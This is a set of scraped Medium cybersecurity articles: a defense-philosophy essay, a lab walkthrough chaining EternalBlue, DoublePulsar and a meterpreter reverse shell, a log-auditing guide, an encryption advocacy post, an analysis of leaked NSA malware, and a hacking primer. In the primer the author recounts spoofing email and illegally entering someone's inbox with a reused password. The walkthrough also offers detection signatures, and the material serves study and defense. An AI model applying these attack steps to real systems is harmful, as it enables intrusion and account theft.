We must break the escalation cycle that locks cyber intruders and their targets in a state where targets are perennially resigned to attacks and intruders are at liberty to exploit and disrupt networks without much risk of suffering consequences, and we must act offensively by directly addressing the “elephant in the living room:” malicious threats are the norm, not the exception. This places us at an advantage because it immediately provides a new context of looking at the pervasive problem.
If we perceive threats as the norm, as they are in a city or an ecology, then it becomes far less acceptable to ignore security, to try to tack it on later. Security engineering needs to go from being different from every other kind of programming to being an element of every kind of programming.
One of the biggest failings of the way that security is currently handled is that so much of it is reactive, and while it’s not the only cause, the Motte and Bailey mindset contributes to the problem in a number of ways. Taking a reactive stance puts the defender at a disadvantage. The attacker need only succeed once, while the defender must succeed every time.
If success or failure is viewed in terms of whether the wall maintained its integrity then all of our attention is focused on building and maintaining the wall. It would be far better, on the other hand, to take a more holistic approach, to familiarize ourselves with all of the known problems both beyond and within the wall. What are we doing here “inside” that may be making an attack more likely to succeed or more harmful if it does?
Returning to our friend M. de la Reynie, one of the things that he did was to mandate that the houses of Paris be laid out according to a regular plan where the streets were all straight, allowing the citizenry and the constabulary to see further ahead and behind. He mandated street lights, to deprive criminals of shadows in which to hide. What can we do to the infrastructure of our local networks and our computers to keep any intruders from being able to do major harm? What have we been doing wrong that gives them an advantage?
If only the wall is tall enough, thick enough, impenetrable enough, the thinking goes, then we would be completely safe. Any single breach, any one attack is seen to be a defeat, an unacceptable loss. Every flaw, every weakness becomes existential, and must be addressed, and in the end, that is an impossible task. If, instead, we realize that there will always be problems, then the task becomes identifying the severity, probability and cost of remedying or mitigating each. We, thus, turn to risk analysis and trade-offs. In addition to focusing on how to prevent all breaches, we can develop a plan for minimizing them as well as plans for how to deal with the inevitable failures.
We apply the wrong tools, and when they don’t work we build a bigger hammer. Since the problem is still there, the other side just looks for its own bigger hammer or a different angle. This is a futile effort, one based upon false assumptions and wrong thinking.
As I wrote in my recent article, The Ancient Art of Cybersecurity, “The security that can be installed is not the true security.” True cybersecurity is a skill, and while “there are tools and weapons that can be used in aid of the skill, … they are not, themselves, important.” If we take a systems view, rely on threat analysis and awareness, teach ourselves, our users, and customers the skills of threat avoidance, then we can escape the cycles of a cyber arms race.
So, what are the lessons to take away from this? First, that the comforting notion of an impenetrable barrier as the basis of security is no more sensible in the realm of cyber security than it is for the modern city or state, nor for a living body. There are far too many “ports” in any given “wall”, and the “interior” is far too complex, with too many actors for that to be a viable strategy. Further, simple models of untrusted enemies, and innocent denizens don’t cover the reality. Threats from inside, both witting, and especially unwitting, are a source of a large portion of the risk.
The design of the infrastructure “inside the wall” is important. Businesses should compartmentalize, separating servers, networks, computers and accounts that are outward facing and most vulnerable from systems, services and accounts dedicated to internal use, and containing key assets. It is inevitable that any enterprise will be breached. The only question is, what assets will be vulnerable when that happens. Defense in depth, with layers of protection is important.
This applies to our homes as well. As small, cheap, limited capability IoT devices proliferate, we need to segregate, using smart hubs or multiple routers to limit the access that a compromised webcam, DVR, thermostat or lightbulb has, and the damage that it can do.
Similarly enterprises, small businesses and families at home need to realize that insiders are one of the biggest risks. Social engineering, “phishing attacks”, attractive apps with trojan horses, and careless talk all put the integrity of our systems at risk. Sharing passwords, opening attachments, downloading software that comes unsolicited and the like are threats that generally outweigh the “barbarians at the gates”.
I offered some thoughts on the nature of True Security, a few weeks back in my article, The Ancient Art of Cybersecurity, and I expect to expand upon what I wrote there and here in the future. Until then, remember that walls and firewalls, and third party add-on security software are not what protect us.
[Update: This article was followed by Cybersecurity as a Living Thing, and Masquerading as Human.]
Written by
","['Cybersecurity', 'Security', 'Privacy', 'Computers', 'History']"
EternalPulsar — A practical example of a made up name,https://medium.com/hackernoon/eternalpulsar-a-practical-example-of-a-made-up-name-629737170a9e?source=tag_archive---------2-----------------------,"Yesterday we were talking about this weekends ShadowBrokers dump (I suggest you read that before continuing here) and noted that within the approximately 32 exploit dump there were several that caught our eye, and have been super fun over the past few days.
EasyFun 2.2.0 (EAFU) which is an exploit for some older versions of WDaemon / MDaemon WorldClient (a mail server that is still very commonly used). The exploit is targeting versions 9.5.6 and older. The current version is 18, so there should be very few of these targets available, right? Wrong.
There are still over 5000 identified potential targets for that exploit, lovely!
The next is the main topic of this article; the EternalBlue exploit for the SMBv2 service within the Windows operating systems combined with the DoublePulsar dropper which can be used to upload malicious .DLLs.
In actuality this attack is very, very, simple, which really make it all the more terrifying. We are going to use the FuzzBunch framework (that we discussed previously) with EternalBlue(EB), to exploit the SMBv2 service on a Windows 7 machine. DoublePulsar(DoPu) will be uploaded as our backdoor and shellscript execution platform, and our payload will be the x64 version of Meterpreter’s (MSF) reverse_tcp. I have taken to calling this exact process ‘EternalPulsar’, yea more cool names we can’t have enough of them!
I tested EternalPulsar in a lab environment with the following setup:
Windows 8.1 (Attacker — 192.168.1.252)Windows 7 (Victim — 192.168.1.123)KaliLinux (MSF Handler — 192.168.1.193)
Simple stages that we will go through are:Payload Creation > EB Exploit > MSF Setup > DoPu Upload > Rooted!
Payload:This one is super simple, we just use msfvenom to create a .DLL that will call back to our MetaSploit listener. Our target is x64 architecture so lets make sure to use the right one (I didn’t originally and slapped myself when DoublePulsar told me off). Set the IP address of the machine you want to call back to, in this case our Kali instance and the port you’re going to listen on.
EB Exploit:Just like the MetaSploit framework, FuzzBunch allows you to ‘use’ and configure exploits, and their payloads.
For the example here I had already configured the target and parameters but they’re fairly self explanatory, you select:- Target IP- Target Port- Callback IP- Confirm target OS- Number of exploit attempts- Target exploitability- Define Delivery type - Remote IP/Port for forwarding (Pivoting)
We then get final verification of settings before being asked if we are ready to fire our exploit.The rest of the process connects to the target device, confirms that its OS matches what is expected based on the configuration for the exploit and that the exploit is not already installed. SMBv1 is used to connect and create a buffer in memory that will in turn become free for our exploit code to reside (Use-After-Free).
Our exploit code is uploaded and the implant placed, which then sends a return code to FuzzBunch to let us know its been successful. This has been identified as setting the SMB Multiplex ID to a value of 82 (52 00h) this is not a standard value for this and has aided us in creating signatures for the identification of the exploit, which we will cover at the end of this article:
MSF Setup:The next step takes us back to MetaSploit to create a simple handler to receive the connection back that our reverse_tcp payload will execute. We have our expected payload, the IP of the listening machine (get it right or you’ll end up listening on 0.0.0.0 ;) and the port that we configured in the payload.
DoPu Upload:We’re finally ready to upload our DoublePulsar backdoor and payload to the victim. As with the launch of EternalBlue we get the configuration options which are largely the same, except we are asked for details of the payload that we want DoublePulsar to execute once its installed. In this case we are using our ‘meter.dll’ which is the configured meterpreter reverse_tcp that we setup in stage 1, as well as the name of the process that we want to inject into, always best to use a standard windows process so we’re certain its there.
We’re breaking security so lets just use lsass.exe which is conveniently the default, we’re again confirming the protocol that we’re attacking (nbt is also an option that needs to be explored further) and the architecture of the target machine.
We get returns confirming that the DoublePulsar backdoor has staged correctly, then that the .DLL shellcode has been built and injected.
And to be quite honest, that’s all she wrote!
Rooted!:We can see in our MetaSploit handler that we don’t even have to do anything further, the payload included in our ‘meter.dll’ has been executed and called back to the Kali instance. On the target system we can see our injected process, our shell, and the connection to our staging system.
We use MetaSploit to access the shell we have and can see that as expected we have full system access as user ‘nt authority\SYSTEM’ which if you are not familiar with windows systems is the highest level of privilege, eg root.
So, what can we do against this? Well as we talked yesterday about MS17–010 which was released for systems newer than VistaSP2, which patches these vulnerabilities and makes you super secure*! (*from this, for now).
Patching, disabling CIFS/SMB is your best bet and will protect you from this iteration of the exploit. Additionally we’ve taken some time pulling apart the SMB traffic that is generated specifically by EternalBlue. Two artifacts we identified were that the installation (as shown above) returned a Multiplex ID of 82 and connection to a current EternalBlue injection (its already been exploited and someones connecting to the present payload) has a Multiplex ID of 81.
These MID values are not used as part of the standard SMB protocol, so are a fairly good base to create a rule (at least that is what I have been working from and created working rules using).
So the rule-set we have in place to identify these within Suricata are as so (and they're a bit raw, I've not done much signature writing):
The rules were tested in my lab Suricata instance and worked on the PCAPs from my testing as well as those provided by Eric Conrad via twitter.
You can grab full version of these signatures from my github: https://github.com/xNymia/Suricata-Signatures
In my opinion, this is going to be an issue for a long time going forward. The number of systems I’ve seen when doing Pentest gigs that are a massive number of patches out of date, sysadmins or devs throwing up test machines of Windows Server 2008 that just get left there unpatched, Windows 7 home machines that people have auto updates disabled. We all know it happens, we all hate it. And now its going bite us. Hard.
And don’t even think about all the people using illegitimately obtained versions of windows in production environments. It’ll give you a headache.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Security', 'Infosec', 'Cybersecurity', 'Microsoft', 'Windows']"
"Event Log Auditing, Demystified - Jeremy Trinka - Medium",https://medium.com/@jeremy.trinka/event-log-auditing-demystified-75b55879f069?source=tag_archive---------4-----------------------,"In my personal experience, the topic of reviewing event logs has received a fair amount grunts, groans, and questions such as “You honestly expect us to review all of that data?!” or “We have so many systems! Where would we even begin?” or “We already have enough on our plate to worry about!”. Fortunately, the times have changed, and log aggregation has matured over a relatively short amount of time. Its existence alone however is not the complete answer to log auditing woes.
To start, let’s cover the ‘why’. What is the purpose of undertaking another tedious task and writing out an elaborate SOP? Well, from a practical perspective, incident detection. According to FireEye/Mandiant’s M-Trends 2018 report, the global median for detection time of their clients in 2017 was an astounding 101 days. Think about your most important systems and they type of data they process. What kind of information could your organization be bleeding in that timeframe? What if you could have been tipped off to that login from a high risk country, or repeated failed login at your critical servers?
Second, most compliance initiatives request that your organization performs some form of auditing on your event logs. The infamous NIST 800–53, commonly cited across SOX, HIPAA, PCI/DSS, and of course FISMA, request that your organization define a timeframe in which you review your logs. See most controls that are prefaced with an “AU”.
Straight forward enough in theory, but let’s examine the practical pieces of the puzzle.
For starters, the idea of connecting into every system week after week to examine countless event codes across your entire network is not feasible. Having access to a plethora of information is great, but potentially useless without something to parse out the noise. If your organization does not currently have a log aggregation solution, get one set up ASAP. The power and insight into a well-structured log aggregation implementation is invaluable to any organization; if not for security reasons, then for operational troubleshooting.
There are quite a few options to choose from, ranging between commercial to open source. Splunk is a clear contender for the top spot, and you can get started with a free 500MB license. Splunk was an early product to the game, and has been extensively covered by numerous cybersecurity outlets. If you are looking for a product with support, this is presently the best route to go. If you are even more cost conscious and feeling adventurous, take a look into the open-sourced ELK Stack. This option combines Elasticsearch, Logstash and Kibana into a robust and cost-effective alternative to the commercial products. An alternate option in the free-to-cheap realm is Graylog, which comes highly regarded across the community.
The choice is yours, but at this point in the game there is no reason to not have one.
Now that you have a place to put your logs, which systems will you pull from and how will you structure them? This one is tough, as guidance typically is not clear. Do you pull logs from all of your servers and workstations? If your resources for storage are unlimited, sure! Unfortunately, this is likely never the case.
The rule of thumb here is to collect enough logs from your critical systems and infrastructure to accomplish successful reconstruction of events on your network. To start, some events you will want to correlate are:
The key is to keep your indexes clean. Think of your indexes as a collection of buckets for your logs. Combining your inputs is the equivalent of mixing your car’s oil collection pan with the water you just pulled from the well. Things swirl around, mix up, and get messy. In the end no one has any idea what is in there, but everyone knows it is useless.
With that being said, it’s time to think about the most efficient use of the data being aggregated. I don’t know about you, but going into your log aggregator of choice with a list of event codes sounds pretty daunting, and likely will lead to the process getting lost in the fray as other “more important” operational tasks take priority. The answer is to assemble a carefully curated dashboard with key artifacts ready for review.
Tools such as Splunk have some excellent built-in visualization capabilities to digest the information as easily as possible (pie charts, tables, etc). A great reference point to get started with is this SANS Reading Room article on the topic of detecting penetration testers on your network. A good penetration test will simulate the actions of an intruder in a controlled fashion, and hone in on some key criteria to detect lateral movement in your network. This includes:
These are all common actions a threat may take to work their way through your network, and should absolutely be raising some eyebrows with your ops teams. I urge you to take a look at the cited reference below, and think to how you can apply these items to your own infrastructure. SANS is a fantastic resource for everything Incident Response and Cybersecurity, and will very likely be a part of your research journeys.
Here’s the fun part (sarcasm, obviously); it’s time to document the process. The unfortunate truth for us tech minded folks is that unless there is a documented policy and procedure, there might as well be no process at all. When an auditor inevitably gives your office a ring and requests a kickoff meeting, you will need to prove the work that was done.
Outline the policy describing what requirements are being fulfilled here. If you made it this far into the article, you likely have a business reason for why this process must be performed, and it should be clearly noted. From there, outline the procedure explaining:
When it comes to tracking your actions, don’t think too hard on it. Leverage your existing ticket tracking or change management system (you do have one… right?) or establish a tracking form/spreadsheet to document your findings. Finally, do your peer review and get the sign-off needed to make it official.
Meeting security requirements in your network can be a tough task, and ambiguously worded guidance doesn’t make things much easier. Hopefully this article has provided you with a place to start when making your organization safer and more compliant in the realm of event log auditing. Having that level of transparency and insight into your network may be the most valuable defense against the ever-changing threat landscape.
Thanks for reading! My goal is to help individuals and organizations tackle complex cybersecurity challenges, and bridge policy into operations. Comments or critiques? Reach me on LinkedIn , Twitter, email — jeremy.trinka[at]gmail[dot]com, or reply below.
Written by
","['Logging', 'Cybersecurity', 'Splunk', 'Auditing']"
Everyday Internet Users Can Stand Up for Encryption — Here’s How,https://medium.com/mozilla-internet-citizen/everyday-internet-users-can-stand-up-for-encryption-here-s-how-8f79d50e6c46?source=tag_archive---------5-----------------------,"At Mozilla, we believe encryption is critical to the health of the Web. It allows us to live, work and play on a more secure Internet. Encryption helps keep the Internet exceptional.
Today, encryption is being threatened around the world. More and more governments are proposing policies that would harm user security by weakening encryption. From France to Australia to the UK, these suggested measures would thwart strong encryption for everyday Internet users. And in the U.S., the FBI was asking Apple to undermine the security of its own products.
At Mozilla, our thoughts are with the victims of recent attacks around the world. Horrific events are a moment where we must not give in to fear and weaken encryption — because encryption is a tool we all rely on every day to keep important information secure, like our financial and medical details.
The latest video in Mozilla’s public education encryption campaign explores threats to encryption around the world:
There is reason for hope — like the open Internet movement’s proven ability to take a stand and make a difference. That’s why we first started our encryption education campaign. We knew encryption would need strong, grassroots support in the coming months and years.
Now, we’re asking everyday Internet users to take an active stand. Sign our pledge to become an encryption champion standing alongside Mozilla.
By adding your name, you’re pledging to take future action to help protect encryption when it matters most. You’re joining a grassroots movement that can call policy makers, share encryption software and tips, and more, if and when necessary. We’re going to need your help with these things in the months and years ahead.
We still have time to speak up and make a difference. The power to protect strong encryption is in our hands — I hope you’ll join Mozilla and stand up for encryption today. Share our videos with your friends and join the over three million people who learned more about how encryption works, why it matters and why it’s worth protecting.
[This blog post originally appeared on blog.mozilla.org on March 30, 2016]
Written by
","['Net Neutrality', 'Encryption', 'Cybersecurity', 'Encryption', 'Mozilla']"
Everything we know of NSA and Five Eyes malware - Nex - Medium,https://medium.com/@botherder/everything-we-know-of-nsa-and-five-eyes-malware-e8eac172d3b5?source=tag_archive---------1-----------------------,"Note: all the information contained in this essay are extracted from documents that have already been previously published by a number of news organizations at different times.
The Snowden revelations have instigated a global outcry for privacy and empowered a more informed and critical analysis of the growing adoption of mass “passive” surveillance. However, the use of “active” surveillance and targeted attacks are commonly deemed as a necessary evil.
After years of publications, and even a massive commercial speculation, on the nature of state-sponsored attacks, particularly by China and Russia, it comes to no surprise that Western governments are also engaged in malware attacks. However, we still know very little on their capabilities and sophistication.
What we are learning is that it isn’t anymore just a matter of pure intelligence or counter-terrorism. A large portion of the attacks we’re seeing from all fronts are mostly political and sometimes economic. In few occasions they’re even in support of military missions. In a climate of fatigue from endless wars, modern day’s imperialism is carried through network packets and conflicts are played in the dark, across submarine cables and Internet routers, far from the sight of the public or the press.
In order to comprehend the true nature of the 21st century’s intelligence and military complex, it’s important to investigate and report on the infiltration capabilities of governments around the world, with no exceptions. If we are selective on the information the public is given, we will obtain a false picture of the ongoing war for Internet and information dominance and we won’t be able to build neutrally secure systems. There’s no space for nationalism in technology.
All the active collection and offensive activities pursued by NSA are funded under a program a document published by Der Spiegel calls GENIE. In NSA’s own words “the GENIE project plans, equips, and conducts Endpoint operations that actively compromise otherwise intactable targets and complement Midpoint programs that passively eavesdrop on communication links”. Among other things the budget includes “sustaining covert domestic” surveillance:
Source: Der Spiegel
And spending tens of million of dollars covertly acquiring 0day vulnerabilities from third parties in a very samaritan program named “Community Investment”:
Source: Der Spiegel
Much of what I’m going to illustrate in this essay is likely to be financed through the GENIE project, whose figures are staggering. NSA allocated more than 650 million dollars in 2013 alone, with the projected budget passing the billion dollars in 2017.
It is unrealistic to expect to understand the depth and the reach of NSA’s malware programs given the amount of resources they are provided with. However thanks to technical research and the journalistic publications of the last year, we’re able to reconstruct some of the missing parts and we can try to put the puzzle back together.
Several documents released by Der Spiegel and The Intercept in the last year demonstrate that the exploitation and infiltration of computers often complements the “passive” collection by providing entrance into systems and networks that would otherwise be invisible to the mass surveillance infrastructure. The separation between mass and targeted surveillance is becoming blurry as we learn of attacks against Internet Service Providers, of targeting of system administrators and systematic compromise of Internet routers.
Dismissing the inherent problems of government hacking as a “necessary and proportionate” use of force is clearly a superficial and dangerous underestimation of the ongoing activities of governments around the world to sabotage the security and integrity of computer systems and of core Internet infrastructure. NSA is excelling at it.
Source: Der Spiegel
A document published by Der Spiegel shows that “active implants”, a fancy term for malware, are used to “copy traffic and direct a copy past a passive collector”. In other words, NSA is creating and deploying dedicated malware with the sole purpose of intercepting traffic they’d otherwise not be able to collect (or collect in clear) and route it through passive collectors that can then pipe it into NSA’s massive collection machinery.
More specifically, they install malware on “network infrastructure devices” to either collect “an entire link without selection” or alternatively do “targeted copying”.
I’m not sure how to emphasize this better. They’re compromising PBXs and similar core infrastructure with malware to mirror entire phone carrier links. Let that sink in for a second.
Source: Der Spiegel
Just to put a name on it, we learn from the same document that an implant calledBRAVENICKEL is the one used to perform the bulk collection from the link layers.HAMMERMILL is instead used for selective interception of traffic, which can then be either sent to the NSA’s passive collection systems or to TAO, possibly for more ad-hoc monitoring operations.
As explained by a different document, also published by Der Spiegel, we learn that more specifically HAMMERMILL is provided with what appear to be two plugins.HAMMERSTEIN to collect VPN key exchanges, and HAMMERCHANT which instead is used to target VoIP traffic. The active collection of keys becomes critical in an attempt to systematically defeat encrypted communications, as better illustrated in this article.
If there is one thing I can say for a fact, is that NSA has malware of all flavors. They have malware for all sorts of devices, platforms, architectures and networks. Their malware programs probably amount to dozens and NSA certainly has a different code name for each and every one of them. It is practically impossible to identify and understand all of them, but we can at least start with the ones that occur more often across the Snowden documents published so far. In the case of NSA, the principal malware programs seem to be VALIDATOR, UNITEDRAKE, and STRAITBIZARRE.
VALIDATOR is an implant used to gain first access on the target device, collect some preliminary information and enable the subsequent deployment of a larger and more sophisticated malware framework. It is unclear what are its specific capabilities, but documents from the ANT catalog published by Der Spiegel in December 2013 suggest that it is at least available for Windows systems as well Internet routers. The SCHOOLMONTANA, SIERRAMONTANA, and STUCCOMONTANA are BIOS backdoors that in fact enable persistence to VALIDATOR on different models of Juniper routers.
Source: Der Spiegel
SOMBERKNAVE is a Windows software implant that can enable VALIDATOR to exfiltrate data even from air-gapped machines by providing “covert internet connectivity for isolated targets”. If there is a Wireless card available, SOMBERKNAVE will attempt to silently associate with any available WiFi and exfiltrate the stolen information through it. Lesson learned: an air-gapped machine isn’t air-gapped as long as it has hardware that can establish any kind of network connection.
However, as anticipated, VALIDATOR is just a reconnaissance tool, a dropper. The following stage of a typical attack would likely involve the deployment of a larger, full-featured and more sensitive implant, generally UNITEDRAKE or STRAITBIZARRE.
UNITEDRAKE is an extensible and modular framework which is provided with a large number of plugins that perform different collection functions, including GROK, a keylogger, SALVAGERABBIT, a USB exfiltration module, FOGGYBOTTOM, which presumably steals history and other information from Internet browsers, GUMFISH, which takes snapshots from a webcam, CAPTIVATEDAUDIENCE, to record audio from the embedded microphone, and WISTFULTOLL, to perform machine reconnaissance and available for STRAITBIZARRE as well.
UNITEDRAKE has been reported in the past in connection with QUANTUM and FOXACID, and despite probably being one of the principal deployments from TAO, it seems to be simply a general purpose malware framework.
Not much else is known about UNITEDRAKE.
STRAITBIZARRE appears to be the largest and most sophisticated malware programs in TAO’s arsenal. It’s a cross-platform implant available on Linux, Windows as well as mobile platforms.
Source: Der Spiegel
The main goal of STRAITBIZARRE is to provide an interface for a large variety of software and hardware implants to exfiltrate data. The ANT catalog published by Der Spiegel in 2013 contains few examples of such implants including COTTONMOUTH, a USB hardware implant which infiltrates in the target network, TOTEGHOSTLY, a STRAITBIZARRE based implant for Windows Mobile phones, and DROPOUTJEEP, a STRAITBIZARRE based implant for Apple iPhones.
The document from which the slide on the side is extracted goes in great length explaining how STRAITBIZARRE implants are used to exfiltrate data from systems that would otherwise be inaccessible or that would require phyisical access to the running device.
Source: Der Spiegel
Additionally, a document recently published by Der Spiegel shows how computers infected with STRAITBIZARRE can be turned into disposable and non-attributable “Shooter” nodes part of the QUANTUM infrastructure. These nodes can then receive messages from TURBINE, NSA’s Command & Control system.
For example, as shown in the diagram on the left, a QUANTUM Shooter (or TAO Shooter) is actively participant in QUANTUM attacks as it is instructed by NSA’s TURBINE to send specifically crafted responses to selected targets and hijack DNS, HTTP or any type of traffic NSA has a QUANTUM attack for.
All in all, STRAIBIZARRE is probably what would keep me up at night.
As of now, there are no indications that either UNITEDRAKE or STRAITBIZARRE have been discovered in the wild, although it is probable that some of the prestigious malware attacks we’ve observed in the past and commonly attributed to the US — such as Stuxnet, Duqu and Flame — might be related to one of the two.
Source: Der Spiegel
Despite having a probably unmatched budget and level of sophistication, NSA obviously isn’t the only member of the Five Eye in the malware business. Documents recently released by Der Spiegeldemonstrate that Five Eyes are in fact collectively developing WARRIORPRIDE,described by the Canadian CSEC as a “scalable, flexible, portable CNE platform” unified across Five Eyes.
Similarly to the malware programs illustrated so far, WARRIORPRIDE also appears to be a complex modular toolkit, provided with a variety of plugins, including some the CSEC explains to be particularly useful for reconnaissance and identification of foreign CNE implants.
Additionally, WARRIORPRIDE is also a multi-platform framework. Records from a GCHQ documentreleased by Der Spiegel show for example that an iPhone implementation has been created as well, and that it has been approved as a QUANTUM-enabled implant.
Along with the recent trove of CNE documents, Der Spiegel also published QWERTY, a keylogger module which appears to be part of the WARRIORPRIDE framework. While we know that the Canadians certainly make use of WARRIORPRIDE, strings in one of the QWERTY binaries suggest that the Australian Defense Signals Directorate (DSD), now just known as Australian Signals Directorate (ASD), might have had a part in the development:
Additionally, the XML definition file for the 20123.sys file from QWERTY shows that it depends on WzowskiLib and CNELib:
Source: Der Spiegel
A different deck from Canadian CSECcontains a slightly modified version of the slide illustrated previously, this time mentioning Wzowski as a “5-eyes API” WARRIORPRIDE is implemented with.
We can deduce that WzowskiLib and CNELib both are libraries collectively developed and used by USA, UK, Canada, Australia and New Zealand as a foundation for developing private as well as shared malware kits, including but not exclusively WARRIORPRIDE.
It is clear now that Five Eyes, especially other than the NSA I imagine, joined efforts to share resources and collectively develop a unified malware program.
At the end of November, Morgan Marquis-Boire and I published together with The Intercept a large collection of samples from a large and sophisticated malware framework commonly identified asRegin, identified during a long investigation into the Belgacom hack.
It was immediately clear that Regin was sophisticated enough to be coming from a Western government, and finding it used against Belgacom was a clear indication that GCHQ might have been responsible. However, I have to admit, I originally didn’t think that any agency other than NSA could have been able to produce a kit as sophisticated as Regin. I soon realized I was wrong.
We know that Regin has been used in the Belgacom hack attributed to — or rather confessed by — the British GCHQ. First documented ties between Regin and GCHQ came with documents released by The Intercept having specific mentions of tools and modules, LEGSPIN and HOPSCOTCH,identified by Kaspersky as part of the Regin framework:
While working on Der Spiegel publication, I started becoming increasingly convinced that Regin might in fact have been DAREDEVIL, what appears to be the GCHQ principal malware program, also mentioned in the screenshot above. All we knew was that Regin was used by GCHQ, so it might as well have been the case. However, my interpretation changed when I noticed this extract from the WARRIORPRIDE slide presented before:
This line can be open to interpretation, but it strongly suggests that WARRIORPRIDE and DAREDEVIL might in fact be different code names for the same malware program; what we commonly call Regin.
Additionally, researchers from Kaspersky were able to tie QWERTY to Regin by finding very clear similarities with a Regin keylogger module in their possession. Kaspersky also showed that QWERTY isn’t functional alone and it instead requires the 50225 Regin module, responsible for kernel-mode hooking. As a side note, I believe 50225 to be U_HookManager mentioned as a plugin dependency in the XML file presented above.
This is significant because it provides a more concrete identification of Regin to a documented malware program from the Five Eyes. As we know that QWERTY is in fact a WARRIORPRIDE module, we might deduce that Regin is likely to be WARRIORPRIDE itself. An additional, but a bit stretched, interpretation might be that DAREDEVIL is a derivation of WARRIORPRIDE or that they might be so closely compatible, that Regin could in fact be the combination of the two.
Source: Der Spiegel
For what it’s worth, there appears to be no evidence or mention of WARRIORPRIDE being used by NSA in any of the documents that have been published so far. What we know however, is that along with STRAITBIZARRE (yes, they mispelled it), DAREDEVIL/WARRIORPRIDE is enabled as a QUANTUM implant.
This however isn’t surprising. In relation to the Belgacom hack, Der Spiegel previously revealed that the infiltration, while operated by GCHQ, was in fact executed through a QUANTUM attack. We can deduce that members of Five Eyes, especially NSA and GCHQ, commonly share infiltration techniques and infrastructure and possibly coordinate to overcome one’s potential technical or legal limitations.
It is very hard to have a clear understanding of the CNE and malware capabilities of NSA, GCHQ and Five Eyes as a whole. There is a large variety of programs and code names and it is clear that many of them are designed in such a way to be compatible and speak the same protocols. In some cases we can expect them to share parts of their code base as well.
The resources at their disposal are enormous, likely unmatched, and certainly their technical sophistication is equally remarkable. Assuming that Regin might in fact be WARRIORPRIDE, we can conclude that we still haven’t seen any of NSA’s malware programs in action. And if we did, we haven’t been able to identify which program they correspond to. My best bet is still on Flame.
Attribution is hard, and many criticize attempts of it as pretentious and most likely wrong. While I’m generally supportive of calling things for what they are, I’m learning that attribution of Western intelligence agencies attacks is incredibly hard. Regin is the closest we have got so far, and still, we likely won’t be able to differentiate one member of the Five Eyes from the others as a sole responsible for a given attack.
At this point much of what is known, and partly even what I explained here, is largely speculative. It is imperative that the technical community keeps conducting analysis of the information at our disposal, connect the dots and fill the blank spots left. Share what you have, publish what you know. Don’t hold back.
Written by
","['Cybersecurity', 'Surveillance']"
Everything You Need To Know About Cyber-Hacking And the Russian Election Hacks,https://medium.com/@jaltucher/everything-you-need-to-know-about-cyber-hacking-and-the-russian-election-hacks-4fe42b292057?source=tag_archive---------7-----------------------,"I’ve spent 30 years hacking computers. I’ve done just about every trick in the book.
Many people I’ve known over the years have spent time in jail or in some other capacity that is specifically unclear after their hacking was uncovered.
And many people I know have never been discovered.
A) THE ABCs OF HACKING
I want to stick to the basics so people can understand what they are seeing in the news and think intelligently about it.
I also want to underline what the real problems are and not just the isolated problems we saw in this past election (although they are serious and I use them to demonstrate why the real issues could be much more serious).
First: what is hacking? How do people hack? What’s the difference between the movies/TV and real hacking? What is legal in this particular situation and what is illegal?
First, the WHAT: How does someone hack in today’s world (and the rules and techniques change constantly since 30 years ago).
TECHNIQUES:
1) HOLES IN THE NETWORK
One time a friend of mine was playing a joke on a well known media company.
For the sake of explanation, let’s say that media company had the initials “M” “T” “V” and just for the purposes of why it would have such strange initials, let’s say that stands for “Music TeleVision”.
MTV had a hole in their network. Every network has thousands of “ports”, like a massive cruise liner.
An “open port” sends messages back and forth. Like someone waving from a cruise ship as it pulls away.
Most ports are simply closed. But some are open in order to receive various special messages.
For instance, there is a port that listens for requests for web pages.
Like when you type into your URL box: “http://mtv.com” a message is sent (usually) to port number 80 at a computer at MTV (or wherever MTV stores their web pages).
Then a special language is spoken between your browser and the server at MTV that is listening to port 80.
An example conversation in the special “HTTP language” might be:
(from the browser) GET /pages/index.html(from the server after sending the html): HTTP 1.1 200 OK
(this is very rough and abbreviated).
There are other ports open to listen to other computers on the local network: requests for files to be transferred in non-HTTP protocols (like FTP), and most importantly, requests for email.
Some software will OPEN unassigned ports for their own nefarious purposes.
Malicious software that keeps track of every letter typed on the keyboard might open and use such a port. VERY common.
Back to: One time in 1995 I was having fun with a friend of mine. He was pulling a prank on MTV.
MTV had an open port that they weren’t protecting properly. It was the SMTP (EMAIL!) port.
I logged directly into it (rather than send an email) and pretended to be “legal@mtv.com” and then I sent an email to my friend from that address saying he was in “BIG TROUBLE” unless he called immediately and confessed.
Fun things happened.
Most companies (maybe 99.99%) have now covered up basic holes like that and it’s much more difficult.
That said, for every type of software that does any network communication, there are always holes in the ports that are forgotten until someone hacks them and then they are patched.
If there’s a new computer or phone, then there are new security breaches. 100% of the time!
2) PASSWORD LAZINESS
Again, 15 or so years ago, I was in charge of a particular website.
Someone was causing a lot of problems on the site. He was a massive troll and was harassing people.
I tried to reason with him, but he ignored me.
So this is basic hack #2.
Most people use the SAME password for everything, or for most things. Hackers know this.
I looked up the password he was using for my site. I then tried it out on his email site.
BING!
I logged into his email (yes…illegally) and learned everything about him. Then I “messed his email up”. I won’t describe what that means but he wasn’t a problem on the website anymore.
This is what happens to trolls: trolls graduate to worse things. 15 years later this person is now in jail for 30 years to life for first degree murder.
This is a longish post because I’m explaining the basics of something that others have put their 10,000 hours into in order to get really good.
But #1 and #2 are the basics of almost all hacking right now.
There’s a #3 and #4 but they are infinitely more complicated and don’t really work except in the movies.
#3: For instance, “packet sniffing” is when someone hacks into the actual network pipes (or wireless) that sends information from outside of a company into a company.
If you can gather all the packets, and then like a giant puzzle, put them in order, you can see every password and piece of information going into a network. Which is a big assumption.
And then you have to assume that packets aren’t encrypted at the “firewall” level of a company, which they almost always are.
So this method is mostly useless.
#4: BOT ARMIES
This is related to other techniques and probably occurred (and is still occurring) with the Russian hacks.
A “bot” is a small piece of software that sits on your computer and sits on most of the other computers in your company’s network.
A Bot is malicious.
It has some code that is ready to do something bad to your network. It got into your computer through some other technique similar to the Russian hack which we will describe below.
Millions of bots exist on computers around the US. Maybe 70 or 80% of companies are infected with “bot armies”.
They are like sleeper cells waiting for a message to act.
Millions of hours of effort are spent identifying bots and eliminating them from networks.
I once visited a company manned by about 100 PHDs that were trying to figure out how to fight bot armies.
They told me something that stuck with me: “No matter how smart we are, the people creating these bots are smarter”.
The answer then is…who knows. Bad things are happening and there’s nothing we can do about it.
But since networks and security are constantly being updated in various unknown ways each year, it’s often hard for the bots to stay updated. This is probably the best defense. So a “sleeper bot” that infected a computer a year ago might be useless today.
